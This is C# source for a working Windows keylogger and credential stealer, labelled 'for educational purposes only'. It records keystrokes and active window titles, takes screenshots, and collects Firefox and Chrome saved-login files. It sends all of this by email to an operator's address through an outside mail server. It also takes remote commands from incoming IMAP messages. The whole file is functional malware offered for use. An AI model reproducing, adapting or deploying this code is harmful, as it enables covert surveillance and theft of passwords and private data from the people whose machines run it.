﻿// FOR EDUCATIONAL PURPOSES ONLY.

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.IO;
using System.Threading;
using System.Net.Mail;
using ImapX;
using System.Net;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using System.Drawing;
using System.Drawing.Imaging;

namespace kl
{
    class Program
    {
        // Is vKey currently pressed.
        [DllImport("user32.dll")]
        static extern short GetAsyncKeyState(int vKey);

        // Get title of current window block
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        private static string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if ((GetWindowText(handle, Buff, nChars) > 0) && (GetWindowText(handle, Buff, nChars) < 257))
            {
                return Buff.ToString();
            }

            else
            {
                return "[INVALID TITLE]";
            }
        }
        // end

        static void takeScreensh(string path)
        {
            var bmpScreensh = new Bitmap(SystemInformation.VirtualScreen.Width,
                                         SystemInformation.VirtualScreen.Height,
                                         PixelFormat.Format32bppArgb);

            var gfxScreensh = Graphics.FromImage(bmpScreensh);

            gfxScreensh.CopyFromScreen(SystemInformation.VirtualScreen.X,
                                       SystemInformation.VirtualScreen.Y,
                                       0,
                                       0,
                                       SystemInformation.VirtualScreen.Size,
                                       CopyPixelOperation.SourceCopy);

            if (File.Exists(path + @"\screen.png"))
            {
                File.Delete(path + @"\screen.png");
            }

            bmpScreensh.Save(path + @"\screen.png", ImageFormat.Png);
        }

        static string getFFProfilePath()
        {
            string ffPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Mozilla\Firefox\";

            bool ffExists = Directory.Exists(ffPath);

            if (ffExists)
            {

                string profile_ini = ffPath + @"\profiles.ini";

                bool profile_iniExists = File.Exists(profile_ini);

                if (profile_iniExists)
                {
                    Console.WriteLine("firefox profile exists");

                    StreamReader rdr = new StreamReader(profile_ini);

                    string resp = rdr.ReadToEnd();

                    string[] lines = resp.Split(new string[] { "\r\n" }, StringSplitOptions.None);

                    string location = lines.First(x => x.Contains("Path=")).Split(new string[] { "=" }, StringSplitOptions.None)[1];

                    string profile_iniPath = ffPath + location;

                    return profile_iniPath;
                }
            }

            return "";
        }

        static void tmpMailer(string smtpSrv, string slaveEmail, string slaveEmailPw, string masterEmail, string fullUser, string subj, List<System.Net.Mail.Attachment> attachments)
        {
            using (SmtpClient tmpSmtpClient = new SmtpClient(smtpSrv))
            {
                tmpSmtpClient.Port = 587;
                tmpSmtpClient.Credentials = new System.Net.NetworkCredential(slaveEmail, slaveEmailPw);
                tmpSmtpClient.EnableSsl = true;

                using (var tmpMail = new MailMessage())
                {
                    tmpMail.Subject = fullUser + " " + subj;
                    tmpMail.From = new System.Net.Mail.MailAddress(slaveEmail);
                    tmpMail.To.Add(masterEmail);

                    if (attachments.Count > 0)
                    {
                        foreach (System.Net.Mail.Attachment attach in attachments)
                        {
                            tmpMail.Attachments.Add(attach);
                        }
                    }

                    try
                    {
                        tmpSmtpClient.Send(tmpMail);
                    }
                   
                    catch (System.Net.Mail.SmtpException)
                    {
                        Console.WriteLine("something something quota\n");
                    }
                }
            }
        }

        static void Main(string[] args)
        {
            List<System.Net.Mail.Attachment> attachments = new List<System.Net.Mail.Attachment>();

            // Paths for browser login files.
            // Firefox login files.
            string ffProfilePath = getFFProfilePath();
            // Replace '/' with '\' in the string.
            ffProfilePath = ffProfilePath.Replace("/", @"\");
            string key3_dbPath = ffProfilePath + @"\key3.db";
            string logins_jsonPath = ffProfilePath + @"\logins.json";
            // Chrome Login Data.
            string chromeLoginsFile = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\Login Data";

            if (File.Exists(chromeLoginsFile))
            {
                Console.WriteLine("found chrome login data\n");
            }

            // Email info
            string masterEmail = "";
            string slaveEmail = "";
            string slaveEmailPw = "";
            string smtpSrv = "mail.cock.li";
            string imapSrv = "mail.cock.li";

            // Path for keyLog.txt.
            string logPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\keyLog.txt";
            StringBuilder logString = new StringBuilder();

            // Get IP
            string externIp = new WebClient().DownloadString("http://icanhazip.com/");
            externIp = externIp.Remove(externIp.Length - 1);

            // Get Windows username.
            string winUser = Environment.UserName;

            // User info.
            string fullUser = winUser + "@" + externIp;
            Console.WriteLine("YOU: " + fullUser + "\n");

            // First line in the log is the info.
            logString.Append(fullUser + "\n\n");

            // Email SEND block
            attachments.Clear();
            tmpMailer(smtpSrv, slaveEmail, slaveEmailPw, masterEmail, fullUser, "CONNECTED", attachments);

            takeScreensh(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
            System.Net.Mail.Attachment screenTMP = new System.Net.Mail.Attachment(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\screen.png");

            attachments.Clear();
            attachments.Add(screenTMP);

            tmpMailer(smtpSrv, slaveEmail, slaveEmailPw, masterEmail, fullUser, "scr", attachments);
            // end Email SEND

            // Email RECEIVE block
            var imapClient = new ImapClient(imapSrv, true);

            imapClient.Connect();
            imapClient.Login(slaveEmail, slaveEmailPw);

            // Idle to receive new messages automatically.
            imapClient.Folders.Inbox.OnNewMessagesArrived += Folder_OnNewMessagesArrived;
            imapClient.Folders.Inbox.StartIdling();

            bool tryGetFFLogins = false;
            bool tryGetChromeLogins = false;

            void Folder_OnNewMessagesArrived(object sender, IdleEventArgs e)
            {
                // IP regex and extract it from the subject.
                string ipPatt = @"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}";
                var subjIp = Regex.Match(e.Messages[0].Subject, ipPatt);

                // Deletes IP and the trailing space after it.
                string subjNoIp = e.Messages[0].Subject.Remove(0, subjIp.Length + 1);

                if ((e.Messages[0].From.ToString() == masterEmail) && (externIp == subjIp.ToString()))
                {
                    Console.WriteLine("COMMAND RECEIVED: " + subjNoIp);

                    // If first message is from an authorized email account and is requesting for data and wasn't seen yet, then flag it as seen and send data.
                    if ((subjNoIp == "do it"))
                    {
                        System.Net.Mail.Attachment logFile = new System.Net.Mail.Attachment(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\keylog.txt");

                        attachments.Clear();
                        attachments.Add(logFile);

                        tmpMailer(smtpSrv, slaveEmail, slaveEmailPw, masterEmail, fullUser, "keyLog", attachments);

                        Console.WriteLine("Sending Telemetry Data To Biker Loft Servers.\nPlease Stay Calm.\n");
                    }

                    // Get logins, if files exist. If they exist but aren't accessible, then keep on trying, until they are accessible. See the main loop for more.
                    else if (subjNoIp == "logins")
                    {
                        if ((ffProfilePath != "") && File.Exists(key3_dbPath) && File.Exists(logins_jsonPath))
                        {
                            tryGetFFLogins = true;
                        }

                        else
                        {
                            attachments.Clear();
                            tmpMailer(smtpSrv, slaveEmail, slaveEmailPw, masterEmail, fullUser, "no Firefox logins", attachments);
                        }

                        if (File.Exists(chromeLoginsFile))
                        {
                            tryGetChromeLogins = true;
                        }

                        else
                        {
                            attachments.Clear();
                            tmpMailer(smtpSrv, slaveEmail, slaveEmailPw, masterEmail, fullUser, "no Chrome logins", attachments);
                        }
                    }

                    // Send messages to console.
                    else if (subjNoIp == "msg")
                    {
                        Console.WriteLine(e.Messages[0].Body.Text);
                    }

                    // Send screenshot.
                    else if (subjNoIp == "scr")
                    {
                        takeScreensh(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
                        System.Net.Mail.Attachment screen = new System.Net.Mail.Attachment(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\screen.png");

                        attachments.Clear();
                        attachments.Add(screen);

                        tmpMailer(smtpSrv, slaveEmail, slaveEmailPw, masterEmail, fullUser, "scr", attachments);

                        Console.WriteLine("*screenshot*\n");
                    }
                }
            }
            // end email RECEIVE

            // Key Logging block
            string currApp = GetActiveWindowTitle();
            DateTime localDate = DateTime.Now;

            while (true)
            {
                // Each 10 millisecs check for key presses.
                Thread.Sleep(10);

                // If login files are not accessible then, keep on trying until they are accessible.
                if (tryGetFFLogins)
                {
                    try
                    {
                        System.Net.Mail.Attachment key3_db = new System.Net.Mail.Attachment(key3_dbPath);
                        System.Net.Mail.Attachment logins_json = new System.Net.Mail.Attachment(logins_jsonPath);

                        attachments.Clear();
                        attachments.Add(key3_db);
                        attachments.Add(logins_json);

                        tmpMailer(smtpSrv, slaveEmail, slaveEmailPw, masterEmail, fullUser, "Firefox logins", attachments);

                        tryGetFFLogins = false;

                        Console.WriteLine("firefox logins sent\n");
                    }

                    catch (IOException) { }
                }

                if (tryGetChromeLogins)
                {
                    try
                    {
                        System.Net.Mail.Attachment loginData = new System.Net.Mail.Attachment(chromeLoginsFile);

                        attachments.Clear();
                        attachments.Add(loginData);

                        tmpMailer(smtpSrv, slaveEmail, slaveEmailPw, masterEmail, fullUser, " Chrome logins", attachments);

                        tryGetChromeLogins = false;

                        Console.WriteLine("chrome logins sent\n");
                    }

                    catch (IOException) { }
                }

                if (currApp != GetActiveWindowTitle())
                {
                    currApp = GetActiveWindowTitle();
                    localDate = DateTime.Now;
                    logString.Append("\n" + localDate.ToString() + " [APP]: " + currApp + "\n");

                    File.WriteAllText(logPath, logString.ToString());
                }

                for (int i = 8; i < 127; i++)
                {
                    if (GetAsyncKeyState(i) == -32767)
                    {
                        switch (i)
                        {
                            case 13: // enter
                                logString.Append("[EN]");
                                break;

                            case 8: // backspace
                                logString.Append("[BS]");
                                break;

                            case 16: // shift
                                logString.Append("[SH]");
                                break;

                            default:
                                logString.Append(Char.ToLower((char)i));
                                break;
                        }

                        File.WriteAllText(logPath, logString.ToString());
                    }
                }
            }
            // end Key Logging block
        }
    }
}
